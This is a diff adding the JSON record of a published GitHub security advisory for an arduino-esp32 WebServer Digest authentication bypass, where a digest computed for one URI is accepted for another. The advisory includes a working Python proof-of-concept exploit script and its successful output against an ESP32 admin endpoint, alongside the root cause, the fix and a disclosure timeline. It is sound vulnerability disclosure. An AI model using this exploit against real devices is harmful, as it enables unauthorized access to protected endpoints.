@@ -1,0 +1,118 @@
+{
+ "author": null,
+ "closed_at": null,
+ "collaborating_teams": null,
+ "collaborating_users": null,
+ "created_at": null,
+ "credits": [
+  {
+   "login": "gladiator9797",
+   "type": "reporter"
+  }
+ ],
+ "credits_detailed": [
+  {
+   "state": "accepted",
+   "type": "reporter",
+   "user": {
+    "avatar_url": "https://avatars.githubusercontent.com/u/38899223?v=4",
+    "events_url": "https://api.github.com/users/gladiator9797/events{/privacy}",
+    "followers_url": "https://api.github.com/users/gladiator9797/followers",
+    "following_url": "https://api.github.com/users/gladiator9797/following{/other_user}",
+    "gists_url": "https://api.github.com/users/gladiator9797/gists{/gist_id}",
+    "gravatar_id": "",
+    "html_url": "https://github.com/gladiator9797",
+    "id": 38899223,
+    "login": "gladiator9797",
+    "node_id": "MDQ6VXNlcjM4ODk5MjIz",
+    "organizations_url": "https://api.github.com/users/gladiator9797/orgs",
+    "received_events_url": "https://api.github.com/users/gladiator9797/received_events",
+    "repos_url": "https://api.github.com/users/gladiator9797/repos",
+    "site_admin": false,
+    "starred_url": "https://api.github.com/users/gladiator9797/starred{/owner}{/repo}",
+    "subscriptions_url": "https://api.github.com/users/gladiator9797/subscriptions",
+    "type": "User",
+    "url": "https://api.github.com/users/gladiator9797",
+    "user_view_type": "public"
+   }
+  }
+ ],
+ "cve_id": "CVE-2026-42855",
+ "cvss": {
+  "score": 7.5,
+  "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+ },
+ "cvss_severities": {
+  "cvss_v3": {
+   "score": 7.5,
+   "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+  },
+  "cvss_v4": {
+   "score": null,
+   "vector_string": null
+  }
+ },
+ "cwe_ids": [
+  "CWE-287"
+ ],
+ "cwes": [
+  {
+   "cwe_id": "CWE-287",
+   "name": "Improper Authentication"
+  }
+ ],
+ "description": "## Summary\r\n\r\n  The `WebServer` Digest authentication implementation in arduino-esp32 computes the authentication hash using the URI field from the client's `Authorization` header, without verifying that it matches the actual requested URI. This allows an attacker who possesses any valid digest response (computed for URI-A) to authenticate requests to a completely different protected URI (URI-B), bypassing per-resource access control.\r\n\r\n  ## Affected component\r\n\r\n  - Repository: `espressif/arduino-esp32`\r\n  - File: `libraries/WebServer/src/WebServer.cpp`, lines 199\u2013263\r\n  - Versions: all releases up to and including **3.3.7**\r\n\r\n  ## Root cause\r\n\r\n  RFC 7616 (HTTP Digest Authentication) requires that the server verify the `uri` field in the Authorization header matches the request URI before accepting the response. The arduino-esp32 implementation computes:\r\n\r\n  HA2 = MD5(method : uri_from_auth_header)\r\n  response = MD5(HA1 : nonce : HA2)\r\n\r\n  The `uri` used for HA2 comes from the client-supplied Authorization header field, not from the HTTP request line. The server never checks whether they match. This means a digest response valid for `/api/public` will also pass validation for `/admin`, because only the client-supplied `uri` value is used in the hash.\r\n\r\n  Relevant code in `WebServer.cpp`:\r\n  ```cpp\r\n  // Lines 199-263: _uri is taken from Authorization header\r\n  _uri = auth_params[\"uri\"];\r\n  // HA2 computed using _uri (attacker-controlled), not the actual request URI\r\n  String HA2 = md5str(String(_server.method() == HTTP_GET ? \"GET\" : \"POST\")\r\n               + \":\" + _uri);\r\n  // _currentUri (the real request URI) is never compared to _uri\r\n\r\n  Proof of Concept\r\n\r\n  Victim firmware: Any Arduino-ESP32 sketch with a Digest-protected endpoint,\r\n  e.g.:\r\n  server.on(\"/admin\", []() {\r\n      if (!server.authenticate(\"admin\", \"secret123\")) {\r\n          server.requestAuthentication(DIGEST_AUTH, \"ESP32\", \"Login\");\r\n          return;\r\n      }\r\n      server.send(200, \"text/html\", \"<h1>ADMIN SECRET</h1>\");\r\n  });\r\n  server.on(\"/api/public\", []() {\r\n      server.send(200, \"text/plain\", \"public OK\");\r\n  });\r\n\r\n  Attacker script (exploit_digest_bypass.py):\r\n\r\n  import socket, hashlib, re\r\n\r\n  target   = \"192.168.4.1\"\r\n  username = \"admin\"\r\n  password = \"secret123\"   # valid credentials for any URI\r\n\r\n  # Step 1 \u2014 get 401 challenge from /admin\r\n  s = socket.socket(); s.connect((target, 80))\r\n  s.send(b\"GET /admin HTTP/1.1\\r\\nHost: \" + target.encode() + b\"\\r\\nConnection: close\\r\\n\\r\\n\")\r\n  resp = s.recv(4096).decode(); s.close()\r\n\r\n  realm = re.search(r'realm=\"([^\"]+)\"', resp).group(1)\r\n  nonce = re.search(r'nonce=\"([^\"]+)\"', resp).group(1)\r\n\r\n  # Step 2 \u2014 compute digest with WRONG URI (the bypass)\r\n  fake_uri = \"/api/public\"  # compute HA2 for this\r\n  real_uri = \"/admin\"       # but send request to this\r\n\r\n  HA1 = hashlib.md5(f\"{username}:{realm}:{password}\".encode()).hexdigest()\r\n  HA2 = hashlib.md5(f\"GET:{fake_uri}\".encode()).hexdigest()\r\n  response_hash = hashlib.md5(f\"{HA1}:{nonce}:{HA2}\".encode()).hexdigest()\r\n\r\n  # Step 3 \u2014 send GET /admin with Authorization for /api/public\r\n  auth = (f'Digest username=\"{username}\", realm=\"{realm}\", nonce=\"{nonce}\", '\r\n          f'uri=\"{fake_uri}\", response=\"{response_hash}\"')\r\n  req = (f\"GET {real_uri} HTTP/1.1\\r\\nHost: {target}\\r\\n\"\r\n         f\"Authorization: {auth}\\r\\nConnection: close\\r\\n\\r\\n\")\r\n\r\n  s = socket.socket(); s.connect((target, 80))\r\n  s.send(req.encode())\r\n  print(s.recv(4096).decode()); s.close()\r\n\r\n  Result on ESP32-D0WD-V3 rev3.1 (arduino-esp32 v3.3.7):\r\n\r\n  Attacker side (server returned 200 on /admin with digest for /api/public):\r\n  HTTP/1.1 200 OK\r\n  Content-Type: text/html\r\n  Content-Length: 22\r\n\r\n  <h1>ADMIN SECRET</h1>\r\n\r\n  ESP32 serial log:\r\n  New client connected\r\n  GET /admin HTTP/1.1 -> 401 Unauthorized\r\n  GET /admin HTTP/1.1 -> 200 OK  <- bypass successful!\r\n\r\n  The digest computed for /api/public was accepted as valid for /admin. URI mismatch was not detected.\r\n\r\n  Impact\r\n\r\n  An attacker who can obtain any valid Digest response for one URI (by observing network traffic, or by computing one using known credentials for a low-privilege endpoint) can replay it to access any other protected URI on the same ESP32 server without recomputing the digest for the target URI.\r\n\r\n  In multi-endpoint deployments where some routes are public and some are admin-only, this allows escalation from no access to full admin access.\r\n\r\n  Fix\r\n\r\n  Fixed in PR #12486 (commit bb86048), released in arduino-esp32 v3.3.8 (2026-04-12). The fix compares the uri field from the Authorization header against the actual request URI and rejects mismatches:\r\n\r\n  // WebServer.cpp \u2014 fix in bb86048\r\n  if (_uri != _currentUri) {\r\n      log_w(\"Digest URI mismatch: auth=%s, request=%s\",\r\n            _uri.c_str(), _currentUri.c_str());\r\n      goto exf;  // reject \u2014 auth URI doesn't match request URI\r\n  }\r\n\r\n  Timeline\r\n\r\n  - 2026-03-27: Vulnerability reported to bugbounty@espressif.com with encrypted attachment\r\n  - 2026-04-01: Fix merged in PR #12486 (commit bb86048)\r\n  - 2026-04-12: Fix released in arduino-esp32 v3.3.8\r\n  - 2026-04-13: Espressif confirmed fix and requested advisory submission\r\n  - 2026-04-22: Reporter submitted GHSA",
+ "ghsa_id": "GHSA-28hv-fwm3-rpcq",
+ "html_url": "https://github.com/espressif/arduino-esp32/security/advisories/GHSA-28hv-fwm3-rpcq",
+ "identifiers": [
+  {
+   "type": "GHSA",
+   "value": "GHSA-28hv-fwm3-rpcq"
+  },
+  {
+   "type": "CVE",
+   "value": "CVE-2026-42855"
+  }
+ ],
+ "private_fork": null,
+ "published_at": "2026-04-28T20:38:28Z",
+ "publisher": {
+  "avatar_url": "https://avatars.githubusercontent.com/u/32426024?v=4",
+  "events_url": "https://api.github.com/users/lucasssvaz/events{/privacy}",
+  "followers_url": "https://api.github.com/users/lucasssvaz/followers",
+  "following_url": "https://api.github.com/users/lucasssvaz/following{/other_user}",
+  "gists_url": "https://api.github.com/users/lucasssvaz/gists{/gist_id}",
+  "gravatar_id": "",
+  "html_url": "https://github.com/lucasssvaz",
+  "id": 32426024,
+  "login": "lucasssvaz",
+  "node_id": "MDQ6VXNlcjMyNDI2MDI0",
+  "organizations_url": "https://api.github.com/users/lucasssvaz/orgs",
+  "received_events_url": "https://api.github.com/users/lucasssvaz/received_events",
+  "repos_url": "https://api.github.com/users/lucasssvaz/repos",
+  "site_admin": false,
+  "starred_url": "https://api.github.com/users/lucasssvaz/starred{/owner}{/repo}",
+  "subscriptions_url": "https://api.github.com/users/lucasssvaz/subscriptions",
+  "type": "User",
+  "url": "https://api.github.com/users/lucasssvaz",
+  "user_view_type": "public"
+ },
+ "severity": "high",
+ "state": "published",
+ "submission": null,
+ "summary": "Digest authentication URI mismatch bypass in WebServer allows cross-resource replay attack",
+ "updated_at": "2026-05-04T14:35:23Z",
+ "url": "https://api.github.com/repos/espressif/arduino-esp32/security-advisories/GHSA-28hv-fwm3-rpcq",
+ "vulnerabilities": [
+  {
+   "package": {
+    "ecosystem": "espressif",
+    "name": "arduino-esp32"
+   },
+   "patched_versions": ">= 3.3.8",
+   "vulnerable_functions": [],
+   "vulnerable_version_range": "<= 3.3.7"
+  }
+ ],
+ "withdrawn_at": null
+}
